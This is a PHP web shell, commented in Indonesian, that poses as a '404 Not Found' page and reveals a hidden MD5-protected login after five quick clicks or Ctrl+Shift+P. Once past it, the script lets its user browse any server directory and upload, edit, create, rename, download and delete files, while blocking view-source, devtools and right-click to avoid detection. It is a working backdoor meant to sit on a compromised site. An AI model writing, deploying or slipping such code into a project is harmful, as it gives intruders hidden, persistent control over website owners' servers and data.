<?php
session_start();

// username login
$LOGIN_USER = 'admin';

// HASIL dari MD5 Hash Generator (contoh: md5('passwordkamu'))
// JANGAN di-md5 lagi di sini
$LOGIN_HASH = '92f8a7adea4d12b08398b78b9c4b9e2d';

$error = '';

// kalau belum lolos login luar
if (empty($_SESSION['outer_loggedin']) || $_SESSION['outer_loggedin'] !== true) {

    // kalau form login dikirim
    if (isset($_POST['login_hidden'])) {
        $u = isset($_POST['username']) ? trim($_POST['username']) : '';
        $p = isset($_POST['password']) ? trim($_POST['password']) : '';

        // cek: user harus cocok, dan md5(password_input) == hash yang kamu simpan
        if ($u === $LOGIN_USER && md5($p) === $LOGIN_HASH) {
            // login sukses -> set session dan reload
            $_SESSION['outer_loggedin'] = true;

            // tambahan: set juga $_SESSION['loggedin'] untuk “kode dalam”
            $_SESSION['loggedin'] = true;

            header("Location: " . $_SERVER['REQUEST_URI']);
            exit;
        } else {
            $error = 'Username atau password salah';
        }
    }

    // TAMPILKAN 404 PALSU + FORM LOGIN TERSEMBUNYI
    ?>
    <!DOCTYPE html>
    <html lang="id">
    <head>
        <meta charset="UTF-8">
        <title>404 Not Found</title>
        <style>
            *{margin:0;padding:0;box-sizing:border-box}
            body{
                font-family:Arial,Helvetica,sans-serif;
                background:#f5f7f9;
                color:#a0a8b3;
                height:100vh;
                display:flex;
                align-items:center;
                justify-content:center;
            }
            .wrapper{text-align:center;}
            .code{
                font-size:26px;
                letter-spacing:2px;
                cursor:pointer;
                user-select:none;
            }
            .code span.sep{
                margin:0 16px;
                color:#c0c6cf;
            }
            .hint{
                margin-top:10px;
                font-size:11px;
                color:#c0c6cf;
            }
            /* FORM LOGIN DISEMBUNYIKAN */
            #login-wrapper{
                margin-top:25px;
                display:none;
            }
            #login-wrapper.show{
                display:block;
            }
            input[type="text"],
            input[type="password"]{
                padding:8px 10px;
                border:1px solid #cdd3dd;
                border-radius:3px;
                font-size:13px;
                outline:none;
                margin-right:4px;
            }
            button{
                padding:8px 14px;
                border:none;
                background:#4b6fff;
                color:#fff;
                font-size:13px;
                border-radius:3px;
                cursor:pointer;
            }
            .error{
                margin-top:8px;
                font-size:11px;
                color:#e74c3c;
            }
        </style>
    </head>
    <body>
    <div class="wrapper">
        <div id="fake404" class="code">
            <span>404</span><span class="sep">|</span><span>NOT FOUND</span>
        </div>
        <div class="hint">Halaman tidak ditemukan</div>

        <div id="login-wrapper">
            <form method="post" autocomplete="off">
                <input type="text" name="username" placeholder="Username" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit" name="login_hidden" value="1">Login</button>
            </form>
            <?php if ($error): ?>
                <div class="error"><?php echo htmlspecialchars($error); ?></div>
            <?php endif; ?>
        </div>
    </div>

        <script>
    (function () {
        const fake404   = document.getElementById('fake404');
        const loginWrap = document.getElementById('login-wrapper');
        let clickCount  = 0;
        let clickTimer  = null;

        function showForm() {
            loginWrap.classList.add('show');
        }

        // Klik 5x cepat pada teks 404
        fake404.addEventListener('click', function () {
            clickCount++;
            if (clickTimer) clearTimeout(clickTimer);
            clickTimer = setTimeout(function () {
                clickCount = 0;
            }, 1000); // reset hitungan dalam 1 detik

            if (clickCount >= 5) {
                showForm();
            }
        });

        document.addEventListener('keydown', function (e) {
            // Ctrl + Shift + P munculkan form
            if (e.ctrlKey && e.shiftKey && (e.key === 'P' || e.key === 'p')) {
                e.preventDefault();
                showForm();
                return;
            }

            // BLOK shortcut umum: Ctrl+U, Ctrl+S, F12, Ctrl+Shift+I, Ctrl+Shift+J
            if (
                (e.ctrlKey && (e.key === 'u' || e.key === 'U')) || // view source
                (e.ctrlKey && (e.key === 's' || e.key === 'S')) || // save page
                (e.key === 'F12') ||                               // devtools
                (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i')) || // devtools
                (e.ctrlKey && e.shiftKey && (e.key === 'J' || e.key === 'j'))    // console
            ) {
                e.preventDefault();
                e.stopPropagation();
            }
        });

        // Blok klik kanan
        document.addEventListener('contextmenu', function (e) {
            e.preventDefault();
        });
    })();
    </script>

    </body>
    </html>
    <?php
    exit; // stop di sini kalau belum login
}

// ================== KODE ASLI KAMU ==================

$root_dir = realpath(__DIR__);
$current_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : $root_dir;

if (!$current_dir || !is_dir($current_dir)) {
    $current_dir = $root_dir;
}

function listDirectory($dir) {
    $files = scandir($dir);
    $directories = [];
    $regular_files = [];

    foreach ($files as $file) {
        if ($file != "." && $file != "..") {
            if (is_dir($dir . '/' . $file)) {
                $directories[] = $file;
            } else {
                $regular_files[] = $file;
            }
        }
    }

    foreach ($directories as $directory) {
        echo '<tr>';
        echo '<td><a href="?dir=' . urlencode($dir . '/' . $directory) . '">📁 ' . $directory . '</a></td>';
        echo '<td>Folder</td>';
        echo '<td>' . date("Y-m-d H:i:s", filemtime($dir . '/' . $directory)) . '</td>';
        echo '<td>
            <a href="?dir=' . urlencode($dir) . '&edit=' . urlencode($directory) . '">Edit</a> |
            <a href="?dir=' . urlencode($dir) . '&delete=' . urlencode($directory) . '">Delete</a> |
            <a href="?dir=' . urlencode($dir) . '&rename=' . urlencode($directory) . '">Rename</a> |
            <a href="?dir=' . urlencode($dir) . '&download=' . urlencode($directory) . '">Download</a>
        </td>';
        echo '</tr>';
    }

    foreach ($regular_files as $file) {
        echo '<tr>';
        echo '<td>' . $file . '</td>';
        echo '<td>' . filesize($dir . '/' . $file) . ' bytes</td>';
        echo '<td>' . date("Y-m-d H:i:s", filemtime($dir . '/' . $file)) . '</td>';
        echo '<td>
            <a href="?dir=' . urlencode($dir) . '&edit=' . urlencode($file) . '">Edit</a> |
            <a href="?dir=' . urlencode($dir) . '&delete=' . urlencode($file) . '">Delete</a> |
            <a href="?dir=' . urlencode($dir) . '&rename=' . urlencode($file) . '">Rename</a> |
            <a href="?dir=' . urlencode($dir) . '&download=' . urlencode($file) . '">Download</a>
        </td>';
        echo '</tr>';
    }
}

if (isset($_GET['delete'])) {
    $item_to_delete = $current_dir . '/' . $_GET['delete'];

    if (is_file($item_to_delete)) {
        unlink($item_to_delete);
    } elseif (is_dir($item_to_delete)) {
        function deleteDir($dir) {
            $files = array_diff(scandir($dir), array('.', '..'));
            foreach ($files as $file) {
                $filePath = "$dir/$file";
                if (is_dir($filePath)) {
                    deleteDir($filePath);
                } else {
                    unlink($filePath);
                }
            }
            rmdir($dir);
        }
        deleteDir($item_to_delete);
    }

    header("Location: ?dir=" . urlencode($_GET['dir']));
    exit;
}

if (isset($_GET['download'])) {
    $file_to_download = $current_dir . '/' . $_GET['download'];
    if (is_file($file_to_download)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file_to_download) . '"');
        header('Content-Length: ' . filesize($file_to_download));
        readfile($file_to_download);
        exit;
    }
}

if (isset($_POST['rename_file'])) {
    $old_name = $current_dir . '/' . $_POST['old_name'];
    $new_name = $current_dir . '/' . $_POST['new_name'];
    rename($old_name, $new_name);
    header("Location: ?dir=" . urlencode($_GET['dir']));
}

if (isset($_POST['upload'])) {
    $target_file = $current_dir . '/' . basename($_FILES["file"]["name"]);
    move_uploaded_file($_FILES["file"]["tmp_name"], $target_file);
    header("Location: ?dir=" . urlencode($_GET['dir']));
}

if (isset($_POST['save_edit'])) {
    $file_to_edit = $current_dir . '/' . $_POST['file_name'];
    $new_content = $_POST['file_content'];
    file_put_contents($file_to_edit, $new_content);
    header("Location: ?dir=" . urlencode($current_dir));
    exit;
}

if (isset($_GET['edit'])) {
    $file_to_edit = $current_dir . '/' . $_GET['edit'];
    if (is_file($file_to_edit)) {
        $file_content = file_get_contents($file_to_edit);
    }
}

if (isset($_POST['create_file'])) {
    $new_file_name = $_POST['new_file_name'];
    $new_file_path = $current_dir . '/' . $new_file_name;
    file_put_contents($new_file_path, "");
    header("Location: ?dir=" . urlencode($_GET['dir']));
}

if (isset($_POST['create_folder'])) {
    $new_folder_name = $_POST['new_folder_name'];
    $new_folder_path = $current_dir . '/' . $new_folder_name;
    mkdir($new_folder_path);
    header("Location: ?dir=" . urlencode($_GET['dir']));
}

if (isset($_GET['rename'])) {
    $rename_item = $_GET['rename'];
    echo '<h2>Rename: ' . htmlspecialchars($rename_item) . '</h2>';
    echo '<form method="post">
            <input type="hidden" name="old_name" value="' . htmlspecialchars($rename_item) . '">
            <input type="text" name="new_name" placeholder="New Name" required>
            <button type="submit" name="rename_file">Rename</button>
          </form>';
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>file manager</title>
    <style>
        body {
            background-color: #121212;
            color: #E0E0E0;
            font-family: Arial, sans-serif;
        }
        h2 {
            color: #BB86FC;
        }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        th, td {
            padding: 10px;
            text-align: left;
        }
        th {
            background-color: #333;
            color: #BB86FC;
        }
        tr:nth-child(even) {
            background-color: #222;
        }
        tr:nth-child(odd) {
            background-color: #121212;
        }
        a {
            color: #03DAC6;
            text-decoration: none;
        }
        a:hover {
            color: #BB86FC;
        }
        button {
            background-color: #03DAC6;
            color: #121212;
            border: none;
            padding: 5px 10px;
            cursor: pointer;
        }
        button:hover {
            background-color: #BB86FC;
        }
        textarea {
            width: 100%;
            height: 400px;
            background-color: #222;
            color: #E0E0E0;
            border: 1px solid #BB86FC;
        }
        input[type="file"], input[type="text"] {
            color: #E0E0E0;
            background-color: #222;
            border: 1px solid #BB86FC;
            padding: 5px;
        }
        .form-container {
            display: flex;
            justify-content: space-between;
            margin-bottom: 10px;
        }
        .form-container form {
            margin-right: 10px;
        }
    </style>
</head>
<body>
    <p>Current Directory: <a href="?dir=<?php echo urlencode(dirname($current_dir)); ?>" style="color: #03DAC6;"><?php echo $current_dir; ?></a></p>
    
    <div class="form-container">
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="file">
            <button type="submit" name="upload">Upload</button>
        </form>

        <form method="post">
            <input type="text" name="new_file_name" placeholder="New File Name" required>
            <button type="submit" name="create_file">Create File</button>
        </form>

        <form method="post">
            <input type="text" name="new_folder_name" placeholder="New Folder Name" required>
            <button type="submit" name="create_folder">Create Folder</button>
        </form>
    </div>

    <?php if (isset($_GET['edit']) && is_file($file_to_edit)) : ?>
        <h2>Edit File: <?php echo htmlspecialchars($_GET['edit']); ?></h2>
        <form method="post">
            <textarea name="file_content"><?php echo htmlspecialchars($file_content); ?></textarea>
            <input type="hidden" name="file_name" value="<?php echo htmlspecialchars($_GET['edit']); ?>">
            <button type="submit" name="save_edit">Save</button>
        </form>
    <?php endif; ?>

        <table>
        <thead>
            <tr>
                <th>File/Folder</th>
                <th>Size</th>
                <th>Last Modified</th>
                <th>Actions</th>
            </tr>
        </thead>
        <tbody>
            <?php listDirectory($current_dir); ?>
        </tbody>
    </table>

    <script>
    // Blok Ctrl+U, Ctrl+S, F12, Ctrl+Shift+I/J dan klik kanan di halaman utama
    document.addEventListener('keydown', function (e) {
        if (
            (e.ctrlKey && (e.key === 'u' || e.key === 'U')) || // view source
            (e.ctrlKey && (e.key === 's' || e.key === 'S')) || // save page
            (e.key === 'F12') ||                               // devtools
            (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i')) || // devtools
            (e.ctrlKey && e.shiftKey && (e.key === 'J' || e.key === 'j'))    // console
        ) {
            e.preventDefault();
            e.stopPropagation();
        }
    });

    document.addEventListener('contextmenu', function (e) {
        e.preventDefault();
    });
    </script>
</body>
</html>

